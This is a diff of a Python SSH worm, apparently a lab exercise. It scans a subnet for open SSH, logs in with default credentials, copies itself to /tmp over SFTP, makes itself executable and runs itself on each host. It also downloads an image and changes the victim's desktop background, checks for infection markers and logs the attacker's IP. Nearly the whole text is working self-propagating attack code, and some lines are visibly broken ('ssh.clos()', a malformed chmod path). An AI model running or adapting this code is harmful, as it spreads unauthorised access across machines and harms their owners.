@@ -2,7 +2,7 @@
 import socket
 import os
 import sys, time
-from datetime import datetime
+import datetime
 import paramiko
 
 # By default, target SSH
@@ -15,6 +15,7 @@ image_name = "hbNtlcJ.jpg"
 remote_username="cpsc"
 remote_password="cpsc"
 worm_name = "worm.py"
+marker_file = "infected.txt"
 # Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
 max_ip = 10
 hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]
@@ -25,7 +26,7 @@ offset = 4 * " "
 
 
 def get_local_ip():
-	""" Gets the current machines local ip, so we don't waste time scanning it """
+	""" Gets the current machines ip, so we don't waste time scanning it """
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	try:
 		sock.connect(('8.8.8.8', 1))
@@ -38,9 +39,8 @@ def get_local_ip():
 	return local_ip
 
 
-
 def scan_port(host, port):
-	""" Scans specified port for a specified host, returns 0 if successful """
+	""" Scans specified port for a specified host, returns 0 on success """
 	exit_code = -1
 	try:
 		# Set up socket to connect to
@@ -76,9 +76,9 @@ def get_vulnerable_hosts(port):
 			continue
 		print ("[+] Scanning %s" % (host))
 		try:
-			port_status = scan_port(host, target_port)
+			port_status = scan_port(host, port)
 			if port_status == 0:
-				print("%s[o] Port %d open!" % (offset, target_port))
+				print("%s[o] Port %d open!" % (offset, port))
 				vulnerable_hosts.append(host)
 		except Exception as e:
 			print ("%s[!] Error scanning %s\n" %(offset, host))
@@ -91,21 +91,20 @@ def get_vulnerable_hosts(port):
 
 
 def set_background(ssh):
-#	ssh.exec_command("export DISPLAY=':0'")
+	""" Downloads a new desktop background for remote system """
 	stdin, stdout, stderr = ssh.exec_command("ls /home/cpsc/")
-	ssh.exec_command("cd ~/")
 
 	# For some reason, readlines() converts text to unicode, so I convert it back
 	l = stdout.readlines()
 	l = [str(name) for name in l]
 	l = [name[0:-1] for name in l]
 	if image_name not in l:
-		print ("%s[o]Adding background..." % (offset))
-		ssh.exec_command("wget " + image_url)
+		print ("%s[o] Adding background..." % (offset))
+		ssh.exec_command("cd ~/ && wget " + image_url)
 		# Need to issue a blocking command so download can finish before we move on?
 		time.sleep(20)
 	else:
-		print ("%s[!] Background already there" % (offset))
+		print ("%s[!] Background already there." % (offset))
 
 	"""
 	try:
@@ -118,12 +117,6 @@ def set_background(ssh):
 
 if __name__ == "__main__":
 	""" Main program that performs the scan """
-
-	# Prove file was infected and ran worm
-	home_directory = os.path.expanduser('~')
-	proof = open(home_directory + "/" + "gotcha.txt", "w")
-	proof.write("Hey guy, you got hacked\n")
-	proof.close()
 	
 	vulnerable_hosts = get_vulnerable_hosts(target_port)
 	print ("\n[Scan Results]")
@@ -131,31 +124,57 @@ if __name__ == "__main__":
 
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+	local_ip = get_local_ip()
 	for host in vulnerable_hosts:
 		print ("[+] Attempting to SSH into %s" % (host))
+
+		# Attempt to SSH into known host
 		try:
 			ssh.connect(host, username="cpsc", password="cpsc")
 		except Exception as e:
-			print ("%s[!] Invalid credentials, skipping." % (offset))
+			print ("%s[!] Bad credentials, skipping." % (offset))
 			continue
 		except KeyboardInterrupt as e:
 			print ("%s[!] Skipping host\n" % (offset))
 			continue
+
+		# Try to put worm on remote system
 		try:
 			sftpClient = ssh.open_sftp()
 			print ("%s[o] Access Granted!" % (offset))
+			
 			try:
-				sftpClient.put(worm_name, "/tmp/" + worm_name)
+				stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
+				results = stdout.readlines()
+				results = [str(name) for name in results]
+				results = [name[0:-1] for name in results]
+				if marker_file in results:
+					print ("Marker found")
+					time = str(datetime.datetime.now()).replace(' ','-')
+					print ("debug1")
+					ssh.exec_command("echo '" + str(local_ip) + "' >> " + "/home/cpsc/log-" + time)
+					print ("debug2")
+					#record = open("/home/cpsc/log-" + time, "w")
+					#record.write(local_ip)
+					#record.close()
+					print ("%s[!] Sytem already infected, skipping." % (offset))
+					continue
+				else:
+					print ("%s[o] Marking system..." % (offset))
+					#ssh.exec_command("echo '1' >> /tmp/" + marker_file)
+					sftpClient.put(worm_name, "/tmp/" + worm_name)
+					
 			except Exception as e:
 				print ("Error with sftpClient.put")
 				pass
 		
+			# Try making worm file executable by all
 			try:
 				ssh.exec_command("chmod a+x /tmp" + worm_name)
 			except Exception as e: 
 				print ("%s [!]Error with chmod", (offset))
 		
+			# Try launching the worm from remote host
 			try:
 				ssh.exec_command("python /tmp/" + worm_name)
 			except Exception as e:
@@ -165,22 +184,25 @@ if __name__ == "__main__":
 			except KeyboardInterrupt as e:
 				print ("%s[!] User stopped, moving to next IP\n" % (offset))
 				pass
-			try:
-				set_background(ssh)
-			except Exception as e:
-				print ("%s[!] Error setting desktop background\n" % (offset))
-				pass
+
+			#try:
+			#	set_background(ssh)
+			#except Exception as e:
+			#	print ("%s[!] Error setting desktop background\n" % (offset))
+			#	pass
 		
-			ssh.close()
+			#ssh.close()
 		except Exception as e:
 			print ("%s[!] Could not SSH into %s\n" % (offset, host))
 			pass
 		except KeyboardInterrupt as e:
-			print ("%s[!] User stopped execution, quitting.\n" % (offset))
+			print ("%s[!] User stopped, quitting.\n" % (offset))
+			ssh.clos()
 			sys.exit(1)
-		
+		finally:
+			set_background(ssh)
+			os.environ["DISPLAY"]=":0"
+			os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/hbNtlcJ.jpg")
+			ssh.close()
 	print ("Finished attacking\n")
-	os.environ["DISPLAY"]=":0"
-	os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/hbNtlcJ.jpg")
-
 
